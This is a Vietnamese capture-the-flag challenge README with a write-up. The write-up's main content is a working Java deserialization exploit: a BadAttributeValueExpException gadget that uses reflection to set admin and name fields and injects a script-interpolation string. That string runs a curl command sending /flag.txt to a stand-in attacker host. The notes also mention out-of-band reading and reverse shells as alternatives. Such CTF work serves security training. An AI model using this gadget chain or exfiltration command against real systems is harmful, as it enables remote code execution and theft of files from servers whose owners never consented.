# Thông tin
- Tác giả: Luk6785  
- Name: Textext
- Description: Đây có phải là một buổi gặp gỡ bình thường hay tiềm ẩn rủi ro nào khác? Liệu bạn có thể tìm thấy chìa khoá trước khi nó bị cướp khỏi ai đó không?  
## Flag
```
BKSEC{Ev3_ry_dAy_a_n3w_knOw1E_dge}
```
## Docker
- Chạy docker-build.sh hoặc tự build bằng tay nếu có lỗi.

## Write-up
- Gọi được hàm toString() và truyền biến name hợp lý.
- Payload
```java
    package com.text.controller;

    import javax.management.BadAttributeValueExpException;
    import java.io.ByteArrayOutputStream;
    import java.io.IOException;
    import java.io.ObjectOutputStream;
    import java.io.Serializable;
    import java.lang.reflect.Field;
    import java.util.Base64;

    public class testPayload implements Serializable {
        public static void main(String[] args) throws IOException {
            Player player = new Player();
            BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
            String ex = "${script:javascript:java.lang.Runtime.getRuntime().exec('curl -F file=@/flag.txt https://dns_attacker')}";
    
            try {
                Field isAdmin = Player.class.getDeclaredField("isAdmin");
                isAdmin.setAccessible(true);
                isAdmin.set(player, true);
    
                Field name = Player.class.getDeclaredField("name");
                name.setAccessible(true);
                name.set(player, ex);
    
                Field val = BadAttributeValueExpException.class.getDeclaredField("val");
                val.setAccessible(true);
                val.set(payload, player);
    
            } catch (NoSuchFieldException e) {
                throw new RuntimeException(e);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
    
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(payload);
            String data = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
            objectOutputStream.close();
    
            System.out.println(data);
        }
    }

```

## Note
- Sau khi deploy docker thì chall sẽ ở http://localhost:8080/text/get-name
- Chall dùng oob đọc flag nên run "ls" không ra kêt quả đâu.
- Chall có cài curl nên tiện dùng curl đọc flag. Ai có cách làm khác như viêt reverse shell thì có thể góp ý.







